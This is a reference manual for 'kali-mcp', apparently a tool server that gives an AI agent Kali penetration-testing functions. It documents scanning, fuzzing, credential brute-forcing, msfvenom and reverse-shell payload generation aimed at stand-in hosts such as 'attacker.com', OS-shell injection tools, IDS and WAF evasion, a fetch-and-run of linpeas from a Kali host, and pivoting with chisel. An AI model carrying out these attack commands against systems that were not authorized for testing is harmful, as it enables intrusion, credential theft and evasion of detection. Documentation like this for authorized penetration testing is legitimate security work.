# kali-mcp Complete Tool Inventory

## 1. CORE OPERATIONS

### run - Execute arbitrary shell commands
**Parameters:**
- `command` (string, required): The bash command to execute

**Usage:**
- Single commands: `run("nmap -sV 192.168.1.1")`
- Complex enumeration: `run("nmap -A -p- --output-xml output.xml 192.168.1.1")`

**Limitations & Patterns:**
- Piped commands may not return output — capture to files instead
  - AVOID: `nmap -p- 192.168.1.1 | grep open`
  - PREFER: `nmap -p- -oG results.txt 192.168.1.1` then read results.txt
- For loops may be blocked — use xargs or parallel instead
  - AVOID: `for i in 1..254; do ping -c 1 192.168.1.$i; done`
  - PREFER: `nmap -sn 192.168.1.0/24` or `seq 1 254 | xargs -I {} ping -c 1 192.168.1.{}`
- Direct output capture works: stdout/stderr returned if command completes

---

### fetch - Fetch and process website content
**Parameters:**
- `url` (string, required): URL to fetch

**Usage:**
- Fetch HTML: `fetch("http://target.com")`
- Fetch and analyze: Used for initial reconnaissance

**Best Practices:**
- Use for initial target reconnaissance
- Returns processed/converted HTML content
- Combines with web_enumeration for full analysis

---

### resources - List available system resources and command examples
**Parameters:** None

**Usage:**
- `resources()` — shows available tools, examples, system info

**Returns:**
- System resource list
- Available command examples
- Reference patterns for CLI tools

---

## 2. SESSION MANAGEMENT

### session_create - Create a new pentest session
**Parameters:**
- `session_name` (string, required): Name for the session
- `description` (string, optional): Session description
- `target` (string, optional): Target for the session

**Usage:**
```
session_create(
  session_name="internal_network_2026-03-22",
  description="Internal network assessment - March 2026",
  target="192.168.1.0/24"
)
```

**Best Practices:**
- Name sessions by target + date: `target_name_YYYY-MM-DD`
- Store metadata: description, scope, client name
- Sessions persist across tool calls — switch with session_switch

---

### session_list - List all pentest sessions
**Parameters:** None

**Usage:**
- `session_list()` — shows all created sessions with metadata

**Returns:**
- Session names
- Descriptions
- Associated targets
- Creation timestamps

---

### session_switch - Switch active session
**Parameters:**
- `session_name` (string, required): Name of session to switch to

**Usage:**
```
session_switch(session_name="internal_network_2026-03-22")
```

**Best Practices:**
- Switch before running enumeration on different targets
- All subsequent commands run in the new session's context
- Evidence/output files automatically organized per session

---

### session_status - Show current session status
**Parameters:** None

**Usage:**
- `session_status()` — shows active session, target, summary

**Returns:**
- Current session name
- Target information
- Session summary/metadata

---

### session_delete - Delete a pentest session
**Parameters:**
- `session_name` (string, required): Name of session to delete

**Usage:**
```
session_delete(session_name="old_session_name")
```

**Caution:**
- Deletes all evidence and output files for the session
- IRREVERSIBLE — only delete completed/archived sessions

---

### session_history - Show command history
**Parameters:** None

**Usage:**
- `session_history()` — shows all commands and evidence from current session

**Returns:**
- Chronological list of executed commands
- Output/evidence files generated
- Timestamps for each action

---

### session_results - Read recent output files
**Parameters:**
- `limit` (integer, optional, default 3): Max files to preview
- `lines` (integer, optional, default 80): Trailing lines per file

**Usage:**
```
session_results(limit=5, lines=100)
```

**Returns:**
- Last N output files from the session
- Trailing lines from each file (for large outputs)
- Quick access to latest enumeration results

---

## 3. RECONNAISSANCE & ENUMERATION

### recon_auto - Automated multi-stage reconnaissance
**Parameters:**
- `target` (string, required): Target domain or IP
- `depth` (string, optional, default "quick"): 
  - `"quick"`: DNS + ports + headers
  - `"standard"`: quick + SSL + exploits
  - `"deep"`: standard + subdomains + web + vulnerabilities

**Usage:**
```
# Quick recon
recon_auto(target="example.com", depth="quick")

# Full recon
recon_auto(target="example.com", depth="deep")
```

**Execution Plan:**
1. DNS enumeration
2. Port scanning (nmap)
3. HTTP headers analysis
4. (standard+) SSL/TLS analysis, exploit search
5. (deep+) Subdomain enumeration, web enumeration, vulnerability scan

**Best Practices:**
- Start with `quick` for initial assessment
- Use `deep` for comprehensive pentests
- Automatically manages evidence collection in session

---

### network_discovery - Multi-stage network reconnaissance
**Parameters:**
- `target` (string, required): Target network (e.g., 192.168.1.0/24) or host
- `discovery_type` (string, optional, default "comprehensive"):
  - `"quick"`: Fast ping sweep
  - `"comprehensive"`: Full nmap + service enumeration
  - `"stealth"`: Slow, stealthy scan

**Usage:**
```
# Quick discovery
network_discovery(target="192.168.1.0/24", discovery_type="quick")

# Comprehensive with service details
network_discovery(target="192.168.1.0/24", discovery_type="comprehensive")

# Stealth scan (IDS evasion)
network_discovery(target="192.168.1.0/24", discovery_type="stealth")
```

**Tools Used:**
- nmap ping sweep / service scan
- Service enumeration and banner grabbing

---

### port_scan - Smart nmap wrapper with presets
**Parameters:**
- `target` (string, required): Target IP or hostname
- `scan_type` (string, optional, default "quick"):
  - `"quick"`: Top 1000 ports, fast
  - `"full"`: All 65535 ports
  - `"stealth"`: Slow, stealthy (IDS evasion)
  - `"udp"`: UDP ports
  - `"service"`: Service version detection
  - `"aggressive"`: Full fingerprint (slow)
- `ports` (string, optional): Custom port specification (e.g., "80,443,8080" or "1-1024")

**Usage:**
```
# Quick scan
port_scan(target="192.168.1.100", scan_type="quick")

# Service detection
port_scan(target="example.com", scan_type="service")

# Custom ports
port_scan(target="192.168.1.100", ports="80,443,8080,3306")

# Full scan (slow)
port_scan(target="192.168.1.100", scan_type="full")
```

**Output:**
- Open ports
- Service names
- Banners (if available)
- Structured findings

---

### vulnerability_scan - Automated multi-tool vulnerability assessment
**Parameters:**
- `target` (string, required): Target IP address or hostname
- `scan_type` (string, optional, default "comprehensive"):
  - `"quick"`: Fast vulnerability check
  - `"comprehensive"`: Multiple tools
  - `"web"`: Web-specific vulnerabilities
  - `"network"`: Network-level vulnerabilities

**Usage:**
```
vulnerability_scan(target="example.com", scan_type="comprehensive")
vulnerability_scan(target="192.168.1.100", scan_type="network")
```

**Tools Invoked:**
- nmap NSE scripts
- nikto (web vulnerabilities)
- OpenVAS-like scripts
- Service-specific checks

---

### web_enumeration - Comprehensive web app discovery
**Parameters:**
- `target` (string, required): Target URL (e.g., http://example.com)
- `enumeration_type` (string, optional, default "full"):
  - `"basic"`: Quick directory/file check
  - `"full"`: Directories, files, endpoints, parameters
  - `"aggressive"`: Full + fuzzing, parameter discovery

**Usage:**
```
web_enumeration(target="http://example.com", enumeration_type="full")
web_enumeration(target="http://target.com:8080", enumeration_type="aggressive")
```

**Tools Invoked:**
- gobuster (directory brute-force)
- nikto (web server scan)
- Parameter discovery
- Technology fingerprinting

---

### web_audit - Comprehensive web application security audit
**Parameters:**
- `url` (string, required): Target URL
- `audit_type` (string, optional, default "comprehensive"):
  - `"comprehensive"`: Full audit
  - `"quick"`: Quick security check

**Usage:**
```
web_audit(url="http://example.com", audit_type="comprehensive")
```

**Coverage:**
- Spider + enumeration
- Form analysis
- Header security
- SSL/TLS configuration
- Known vulnerabilities

---

### subdomain_enum - Enumerate subdomains
**Parameters:**
- `url` (string, required): Target website URL
- `enum_type` (string, optional, default "comprehensive"):
  - `"comprehensive"`: Multiple tools (subdomain wordlist, DNS)
  - `"quick"`: Fast DNS enumeration

**Usage:**
```
subdomain_enum(url="example.com", enum_type="comprehensive")
subdomain_enum(url="target.io", enum_type="quick")
```

**Tools Invoked:**
- subfinder
- amass
- DNS wordlist brute-force

---

### dns_enum - Comprehensive DNS enumeration
**Parameters:**
- `domain` (string, required): Target domain
- `record_types` (string, optional, default "all"):
  - `"all"`: A, AAAA, MX, NS, TXT, SOA, CNAME, SRV, CAA
  - Comma-separated: `"a,mx,txt,ns"` for specific types

**Usage:**
```
dns_enum(domain="example.com", record_types="all")
dns_enum(domain="target.com", record_types="mx,txt,ns")
```

**Attempts:**
- Zone transfers
- DNS record enumeration
- Subdomain discovery via DNS

---

### enum_shares - SMB/NFS share enumeration
**Parameters:**
- `target` (string, required): Target host
- `enum_type` (string, optional, default "all"):
  - `"smb"`: SMB shares only
  - `"nfs"`: NFS shares only
  - `"all"`: Both SMB and NFS
- `username` (string, optional): Optional SMB username
- `password` (string, optional): Optional SMB password

**Usage:**
```
enum_shares(target="192.168.1.100", enum_type="all")
enum_shares(target="fileserver.local", username="guest", password="guest")
```

**Tools:**
- smbclient
- enum4linux
- showmount (NFS)

---

## 4. WEB APPLICATION TESTING

### spider_website - Spider a website for links/resources
**Parameters:**
- `url` (string, required): Target URL to spider
- `depth` (integer, optional, default 2): Maximum crawl depth
- `threads` (integer, optional, default 10): Concurrent threads

**Usage:**
```
spider_website(url="http://example.com", depth=2, threads=10)
spider_website(url="http://target.com", depth=3, threads=20)
```

**Returns:**
- All discovered links
- Resources (images, CSS, JS, etc.)
- Endpoints
- Parameters

---

### form_analysis - Analyze web forms for vulnerabilities
**Parameters:**
- `url` (string, required): URL of the web form
- `scan_type` (string, optional, default "comprehensive"):
  - `"comprehensive"`: Full analysis
  - `"quick"`: Quick scan

**Usage:**
```
form_analysis(url="http://example.com/login", scan_type="comprehensive")
```

**Checks:**
- Input field types and names
- Form methods (GET/POST)
- CSRF protection
- Client-side validation
- Known vulnerabilities

---

### header_analysis - Analyze HTTP headers
**Parameters:**
- `url` (string, required): Target URL
- `include_security` (boolean, optional, default true): Include security headers

**Usage:**
```
header_analysis(url="http://example.com", include_security=true)
```

**Returns:**
- All HTTP headers
- Security headers (CSP, X-Frame-Options, etc.)
- Missing security headers
- Header configuration issues

---

### ssl_analysis - Analyze SSL/TLS configuration
**Parameters:**
- `url` (string, required): Target URL
- `port` (integer, optional, default 443): HTTPS port

**Usage:**
```
ssl_analysis(url="example.com", port=443)
ssl_analysis(url="custom-ssl.com", port=8443)
```

**Tools:**
- testssl.sh
- sslscan

**Returns:**
- Certificate information
- Protocol versions (TLS 1.0, 1.1, 1.2, 1.3)
- Cipher suites
- Known vulnerabilities (POODLE, Heartbleed, etc.)
- Configuration issues

---

## 5. DATA PROCESSING & PARSING

### parse_nmap - Parse nmap output
**Parameters:**
- `filepath` (string, required): Path to nmap output file (text or XML)

**Usage:**
```
parse_nmap(filepath="/path/to/nmap_output.xml")
parse_nmap(filepath="/path/to/nmap_results.txt")
```

**Returns:**
- Structured findings
- Open ports
- Services and versions
- Hosts

---

### parse_tool_output - Parse tool-specific output
**Parameters:**
- `filepath` (string, required): Path to tool output file
- `tool_type` (string, optional, default "auto"):
  - `"auto"`: Auto-detect tool type
  - `"nikto"`: Nikto scan results
  - `"gobuster"`: Gobuster enumeration
  - `"dirb"`: DIRB enumeration
  - `"hydra"`: Hydra brute-force results
  - `"sqlmap"`: SQLmap results

**Usage:**
```
parse_tool_output(filepath="/path/to/nikto_output.txt")
parse_tool_output(filepath="/path/to/gobuster.txt", tool_type="gobuster")
parse_tool_output(filepath="/path/to/hydra_results.txt", tool_type="hydra")
```

**Returns:**
- Structured findings
- Parsed results in consistent format

---

### file_analysis - Analyze a file
**Parameters:**
- `filepath` (string, required): Path to the file

**Usage:**
```
file_analysis(filepath="/path/to/binary")
file_analysis(filepath="/path/to/unknown_file")
```

**Analysis:**
- File type detection
- Strings extraction
- MD5/SHA hash

---

### hash_identify - Identify hash types
**Parameters:**
- `hash_value` (string, required): The hash string to identify

**Usage:**
```
hash_identify(hash_value="5d41402abc4b2a76b9719d911017c592")
hash_identify(hash_value="$2y$10$abcdef...")
```

**Returns:**
- Hash type (MD5, SHA-1, SHA-256, bcrypt, NTLM, etc.)
- Possible algorithms
- Strength assessment

---

## 6. EXPLOITATION & PAYLOADS

### exploit_search - Search for exploits
**Parameters:**
- `search_term` (string, required): Term to search (e.g., 'Apache', 'CVE-2021-44228')
- `search_type` (string, optional, default "all"):
  - `"all"`: All exploit types
  - `"web"`: Web exploits
  - `"remote"`: Remote code execution
  - `"local"`: Local privilege escalation
  - `"dos"`: Denial of Service

**Usage:**
```
exploit_search(search_term="Apache 2.4.49", search_type="remote")
exploit_search(search_term="CVE-2021-44228", search_type="all")
exploit_search(search_term="WordPress", search_type="web")
```

**Database:**
- searchsploit
- ExploitDB
- Metasploit

---

### payload_generate - Generate msfvenom payloads
**Parameters:**
- `payload_type` (string, required):
  - `"reverse_shell"`: Reverse shell
  - `"bind_shell"`: Bind shell
  - `"meterpreter"`: Meterpreter payload
- `platform` (string, required):
  - `"linux"`, `"windows"`, `"osx"`, `"php"`, `"python"`
- `lhost` (string, required): Listener IP address
- `lport` (integer, optional, default 4444): Listener port
- `format` (string, optional, default "raw"):
  - `"elf"`: Linux executable
  - `"exe"`: Windows executable
  - `"raw"`: Raw shellcode
  - `"python"`: Python script
  - `"php"`: PHP script
  - `"war"`: Java WAR file
- `encoder` (string, optional): Encoder (e.g., x86/shikata_ga_nai)

**Usage:**
```
payload_generate(
  payload_type="reverse_shell",
  platform="linux",
  lhost="192.168.1.100",
  lport=4444,
  format="elf"
)

payload_generate(
  payload_type="meterpreter",
  platform="windows",
  lhost="attacker.com",
  format="exe",
  encoder="x86/shikata_ga_nai"
)
```

---

### reverse_shell - Generate reverse shell one-liners
**Parameters:**
- `lhost` (string, required): Listener IP
- `lport` (integer, optional, default 4444): Listener port
- `shell_type` (string, optional, default "bash"):
  - `"bash"`, `"python"`, `"php"`, `"perl"`, `"powershell"`, `"nc"`, `"ruby"`, `"java"`

**Usage:**
```
reverse_shell(lhost="192.168.1.100", lport=4444, shell_type="bash")
reverse_shell(lhost="attacker.com", shell_type="python")
reverse_shell(lhost="192.168.1.100", shell_type="powershell")
```

**Returns:**
- Ready-to-use shell command
- No setup required

---

### hydra_attack - Brute-force credential testing
**Parameters:**
- `target` (string, required): Target host
- `service` (string, optional, default "ssh"):
  - `"ssh"`, `"ftp"`, `"http-get"`, `"http-post-form"`, `"smb"`, `"mysql"`, `"rdp"`, `"telnet"`, `"vnc"`, `"pop3"`, `"imap"`, `"smtp"`
- `username` (string, optional): Single username to try
- `userlist` (string, optional): Path to username wordlist
- `password` (string, optional): Single password to try
- `passlist` (string, optional): Path to password wordlist
- `threads` (integer, optional, default 16): Number of threads
- `extra_opts` (string, optional): Additional hydra options

**Usage:**
```
# Single credentials
hydra_attack(
  target="192.168.1.100",
  service="ssh",
  username="admin",
  passlist="/usr/share/wordlists/rockyou.txt"
)

# Wordlist-based
hydra_attack(
  target="example.com",
  service="http-post-form",
  userlist="/tmp/users.txt",
  passlist="/tmp/passwords.txt",
  threads=32
)

# SMB brute-force
hydra_attack(
  target="192.168.1.50",
  service="smb",
  username="Administrator",
  passlist="/usr/share/wordlists/rockyou.txt"
)
```

---

## 7. UTILITIES

### encode_decode - Multi-format encoding/decoding
**Parameters:**
- `data` (string, required): The data to encode or decode
- `operation` (string, optional, default "encode"):
  - `"encode"`: Encode the data
  - `"decode"`: Decode the data
- `format` (string, optional, default "base64"):
  - `"base64"`: Base64
  - `"url"`: URL encoding
  - `"hex"`: Hexadecimal
  - `"html"`: HTML entities
  - `"rot13"`: ROT13 cipher

**Usage:**
```
encode_decode(data="Hello World", operation="encode", format="base64")
encode_decode(data="SGVsbG8gV29ybGQ=", operation="decode", format="base64")
encode_decode(data="hello world", operation="encode", format="url")
encode_decode(data="SGVsbG8gV29ybGQ=", operation="decode", format="rot13")
```

---

### credential_store - Store/retrieve discovered credentials
**Parameters:**
- `action` (string, optional, default "list"):
  - `"add"`: Add new credential
  - `"list"`: List all stored credentials
  - `"search"`: Search for specific credentials
- `target` (string, optional): Target host/IP
- `service` (string, optional): Service type (ssh, ftp, http, etc.)
- `username` (string, optional): Username
- `password` (string, optional): Password
- `notes` (string, optional): Additional notes

**Usage:**
```
# Add found credentials
credential_store(
  action="add",
  target="192.168.1.100",
  service="ssh",
  username="admin",
  password="admin123",
  notes="SSH service on port 22"
)

# List all
credential_store(action="list")

# Search
credential_store(action="search", target="192.168.1.100")
credential_store(action="search", service="ssh")
```

---

### save_output - Save evidence to timestamped file
**Parameters:**
- `content` (string, required): Content to save
- `filename` (string, optional): Custom filename (without extension)
- `category` (string, optional, default "general"): Category for organizing files (e.g., 'scan', 'enum', 'evidence')

**Usage:**
```
save_output(
  content="Port 22: OpenSSH 7.4\nPort 80: Apache 2.4.6",
  filename="service_banner_grab",
  category="enum"
)

save_output(
  content="Found valid credentials: admin/admin123",
  category="evidence"
)
```

**Output:**
- Timestamped file saved to session evidence folder
- Organized by category

---

### create_report - Generate structured report
**Parameters:**
- `title` (string, required): Report title
- `findings` (string, required): Findings content
- `report_type` (string, optional, default "markdown"):
  - `"markdown"`: Markdown format
  - `"text"`: Plain text
  - `"json"`: JSON format

**Usage:**
```
create_report(
  title="Security Assessment Report - Example.com",
  findings="Critical: SQL Injection found on /login\nHigh: Weak SSL configuration",
  report_type="markdown"
)
```

---

### download_file - Download file from URL
**Parameters:**
- `url` (string, required): URL to download from
- `filename` (string, optional): Custom filename for the downloaded file

**Usage:**
```
download_file(url="http://example.com/exploit.sh", filename="exploit")
download_file(url="https://github.com/exploit/raw/main/payload")
```

---

## 8. COMMAND-LINE TOOLS AVAILABLE IN CONTAINER

### Network Scanning & Reconnaissance
- **nmap** - Network mapper (all scan types supported via port_scan)
- **netcat (nc)** - Network Swiss Army knife
- **socat** - Socket relay tool
- **ping/traceroute** - Network diagnostics

### Web Application Testing
- **nikto** - Web server scanner
- **gobuster** - Directory/file/DNS brute-force
- **dirb/dirbuster** - Directory enumeration
- **wfuzz** - Web fuzzer
- **feroxbuster** - Fast web brute-forcer
- **ffuf** - Fuzzing tool
- **httpx** - HTTP probe tool
- **katana** - Web crawler
- **gau** - Get All URLs
- **waybackurls** - Wayback machine URLs
- **whatweb** - Web technology fingerprinter
- **wpscan** - WordPress vulnerability scanner
- **nuclei** - Vulnerability scanner (templates)

### Exploitation
- **metasploit (msfconsole)** - Exploitation framework
- **msfvenom** - Payload generator
- **searchsploit** - Exploit database search

### Cryptography & Hashing
- **john** - Password cracker
- **hashcat** - GPU-accelerated hash cracker
- **openssl** - Cryptography tools

### Brute-Force & Credential Testing
- **hydra** - Parallel network login tool
- **medusa** - Parallel login brute-forcer

### SSL/TLS Analysis
- **testssl.sh** - SSL/TLS configuration test
- **sslscan** - SSL scanner
- **openssl s_client** - Certificate inspection

### DNS & Network Enumeration
- **dig/nslookup** - DNS queries
- **whois** - WHOIS queries
- **amass** - Asset mapping
- **subfinder** - Subdomain discovery

### Traffic Analysis
- **tcpdump** - Packet capture
- **wireshark (tshark)** - Traffic analysis

### SMB/File Shares
- **smbclient** - SMB client
- **enum4linux** - SMB enumeration
- **showmount** - NFS mount enumeration

### General Utilities
- **curl/wget** - HTTP clients
- **jq** - JSON processor
- **sed/awk/grep** - Text processing
- **strings** - Extract strings from binaries
- **file** - File type detection
- **md5sum/sha256sum** - Hash computation

---

## OPTIMAL USAGE PATTERNS

### Pattern 1: Complete Web Application Assessment
```
1. web_enumeration(target="http://target.com", enumeration_type="full")
2. header_analysis(url="http://target.com")
3. ssl_analysis(url="target.com", port=443)
4. form_analysis(url="http://target.com/login")
5. web_audit(url="http://target.com", audit_type="comprehensive")
```

### Pattern 2: Network Reconnaissance
```
1. network_discovery(target="192.168.1.0/24", discovery_type="comprehensive")
2. port_scan(target="192.168.1.100", scan_type="full")
3. exploit_search(search_term="service_name_and_version")
```

### Pattern 3: Subdomain & DNS Enumeration
```
1. subdomain_enum(url="example.com", enum_type="comprehensive")
2. dns_enum(domain="example.com", record_types="all")
3. port_scan(target="discovered.subdomain.example.com", scan_type="service")
```

### Pattern 4: Exploitation Workflow
```
1. exploit_search(search_term="CVE-XXXX-XXXXX", search_type="all")
2. payload_generate(payload_type="reverse_shell", platform="linux", lhost="ATTACKER_IP", lport=4444)
3. hydra_attack(target="192.168.1.100", service="ssh", passlist="/path/to/wordlist.txt")
```

### Pattern 5: Session-Persistent Enumeration
```
1. session_create(session_name="target_2026_03_22", target="example.com")
2. recon_auto(target="example.com", depth="deep")
3. session_results(limit=10)
4. save_output(content="key findings")
5. create_report(title="Assessment Report", findings="findings from session")
```

---

## NEW CLI TOOLS (v4 additions — use via run())

### feroxbuster — Recursive content discovery (Rust)
```bash
# Recursive directory scan with JSON output
run("feroxbuster -u https://target.com -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -r --silent -o /tmp/ferox.json --json -t 50 -d 3")
# With extensions
run("feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt -x php,asp,aspx,jsp -o /tmp/ferox.json --json")
```
**Replaces gobuster for recursive web discovery.** Gobuster still preferred for DNS/vhost modes.

### nuclei — Template-based vulnerability scanner
```bash
# Update templates first
run("nuclei -update-templates")
# Scan with severity filter
run("nuclei -u https://target.com -severity critical,high,medium -json -o /tmp/nuclei.json -rate-limit 50")
# Custom templates
run("nuclei -u https://target.com -t /mnt/c/dev/pentest-framework/templates/nuclei-custom/ -json -o /tmp/nuclei-custom.json")
```
**10K+ community templates.** Custom org-specific templates at `/mnt/c/dev/pentest-framework/templates/nuclei-custom/`.

### ffuf — Fast web fuzzer
```bash
# Directory fuzzing
run("ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302,403 -o /tmp/ffuf.json -of json")
# Parameter fuzzing
run("ffuf -u 'https://target.com/api?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -o /tmp/ffuf-params.json -of json")
# Header fuzzing
run("ffuf -u https://target.com -H 'X-Custom: FUZZ' -w wordlist.txt -o /tmp/ffuf-headers.json -of json")
```
**Most versatile fuzzer — beyond directories: parameters, headers, POST bodies.**

### katana — Modern web crawler
```bash
run("katana -u https://target.com -d 3 -jc -json -o /tmp/katana.json")
```
**JavaScript-aware crawling.** Finds endpoints that traditional crawlers miss in SPAs.

### gau — Historical URL discovery
```bash
run("gau target.com --o /tmp/gau.txt")
```
**Fetches known URLs from Wayback Machine, Common Crawl, OTX, URLScan.**

### grpcurl — gRPC service testing
```bash
# List services (reflection enabled)
run("grpcurl -plaintext target.com:50051 list")
# Describe service
run("grpcurl -plaintext target.com:50051 describe ServiceName")
# Call method
run("grpcurl -plaintext -d '{\"field\":\"value\"}' target.com:50051 ServiceName/MethodName")
```
**Required for gRPC API testing (Phase 2Q).** Traditional HTTP tools can't inspect gRPC.

### Exploitation Tools (v4 additions — via run())

```bash
# dalfox — Automated XSS scanner with WAF bypass (Go)
run("dalfox url 'https://target.com/search?q=test' --deep-domxss --waf-evasion --follow-redirects -o /tmp/dalfox.txt")
run("cat /tmp/params.txt | dalfox pipe --waf-evasion -o /tmp/xss-results.txt")

# Arjun — Hidden HTTP parameter discovery (25K+ wordlist)
run("arjun -u https://target.com/api/endpoint -m POST -t 10 -oJ /tmp/arjun-params.json")
run("arjun -u https://target.com/page -m GET -oJ /tmp/arjun-get.json")

# ParamSpider — Historical parameter URL mining from Wayback Machine
run("paramspider -d target.com --exclude woff,css,js,png,svg,jpg --output /tmp/paramspider.txt")

# commix — Automated OS command injection exploitation
run("commix -u 'https://target.com/api?cmd=test' --all --batch --level=3 --os-cmd='id'")
run("commix -u 'https://target.com/api?cmd=test' --all --batch --os-shell")

# SSTImap — Automated SSTI detection + RCE (Jinja2, Twig, Freemarker, Velocity, Pebble, Smarty, ERB)
run("python3 /opt/SSTImap/sstimap.py -u 'https://target.com/page?name=test' --os-shell --level 5")

# jwt_tool — JWT attack automation (alg:none, key confusion, brute force, claim tamper)
run("python3 /opt/jwt_tool/jwt_tool.py <JWT_TOKEN> -M at -t https://target.com/api -rh 'Authorization: Bearer'")
run("python3 /opt/jwt_tool/jwt_tool.py <JWT_TOKEN> -C -d /usr/share/seclists/Passwords/Common-Credentials/best1050.txt")

# XSStrike — Context-aware XSS scanner with fuzzer
run("python3 /opt/XSStrike/xsstrike.py -u 'https://target.com/search?q=test' --crawl -l 3 --blind")

# GraphQLmap — GraphQL exploitation (introspection, injection, mutation abuse)
run("python3 /opt/GraphQLmap/graphqlmap.py -u https://target.com/graphql --dump --method POST")

# NoSQLMap — NoSQL injection (MongoDB, CouchDB, Redis)
run("python3 /opt/NoSQLMap/nosqlmap.py -u https://target.com/login -p username,password --attack 2")

# smuggler — HTTP request smuggling detection (CL.TE, TE.CL, TE.TE)
run("python3 /opt/smuggler/smuggler.py -u https://target.com -vv")
```

### Post-Exploitation Tools (via run())

```bash
# linPEAS — Linux privilege escalation enumeration
# Transfer to target: wget http://<KALI_IP>:8080/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh -a
run("python3 -m http.server 8080 &")  # Serve from /opt/

# pspy — Unprivileged process spy (detects hidden cron/root commands)
# Transfer: wget http://<KALI_IP>:8080/pspy64 && chmod +x pspy64 && ./pspy64

# chisel — HTTP tunneling/pivoting (single binary)
run("/opt/chisel server --reverse --port 8080")
# Target runs: chisel client <KALI_IP>:8080 R:socks

# PayloadsAllTheThings — Reference payloads (offline, /opt/PayloadsAllTheThings/)
run("ls /opt/PayloadsAllTheThings/")
run("cat /opt/PayloadsAllTheThings/SQL\\ Injection/MySQL\\ Injection.md")
```

### Aggressive Scanning Pipeline (chained tools)

```bash
# Full XSS pipeline: discover params → scan XSS
run("paramspider -d target.com --output /tmp/urls.txt")
run("cat /tmp/urls.txt | dalfox pipe --waf-evasion -o /tmp/xss-all.txt")

# Full injection pipeline: discover params → test SQLi + CMDi + SSTI
run("arjun -u https://target.com/api -m POST -oJ /tmp/params.json")
# Then test each discovered param with sqlmap, commix, sstimap

# Full recon-to-exploit pipeline
# subfinder → httpx → nuclei → dalfox/sqlmap/commix (based on findings)
```

### Python Libraries (available in venv)
```bash
# CVSS 4.0 scoring
run("python3 -c \"from cvss import CVSS4; c=CVSS4('CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N'); print(c.scores[0])\"")
# python-docx for report generation
run("python3 /mnt/c/dev/pentest-framework/scripts/generate-pentest-report.py <target>")
```

---

### Defensive / Incident Response Tools (via run())

```bash
# File encryption (openssl — available in kali)
run("openssl enc -aes-256-cbc -salt -pbkdf2 -in <file> -out <file>.enc -pass pass:<PASSWORD>")
run("openssl enc -aes-256-cbc -d -pbkdf2 -in <file>.enc -out <file> -pass pass:<PASSWORD>")

# Secure file deletion
run("shred -vfz -n 3 <file>")           # 3-pass overwrite + zero fill
run("find <dir> -type f -exec shred -vfz -n 3 {} \\;")  # Recursive

# Remote file management via SSH
run("ssh user@<ip> 'ls -la <path>'")
run("scp user@<ip>:<remote-path> <local-path>")
run("ssh user@<ip> 'tar czf - <dir>' > backup.tar.gz")

# GPG encryption
run("gpg --batch --yes --passphrase '<PASSWORD>' -c <file>")
run("gpg --batch --yes --passphrase '<PASSWORD>' -d <file>.gpg > <file>")
```

**Use case:** Incident response on own infrastructure. Encrypt sensitive files, backup critical data, securely delete compromised files. See playbook Phase 3C.

---

## KEY CONSTRAINTS & BEST PRACTICES

1. **Piped Commands**: Avoid pipes in run() — save output to files instead
2. **Loops**: Avoid for-loops — use xargs or parallel instead
3. **Session Persistence**: Use sessions to organize work by target
4. **Output Management**: Always save important output via save_output()
5. **Evidence Collection**: Reports generated per session for client deliverables
6. **Wordlist Paths**: Standard paths include /usr/share/wordlists/ (rockyou.txt, etc.)
7. **Authorization**: Only use on authorized targets/CTF/defensive scenarios
8. **Rate Limiting**: Adjust thread counts (threads param) to avoid detection/blocking

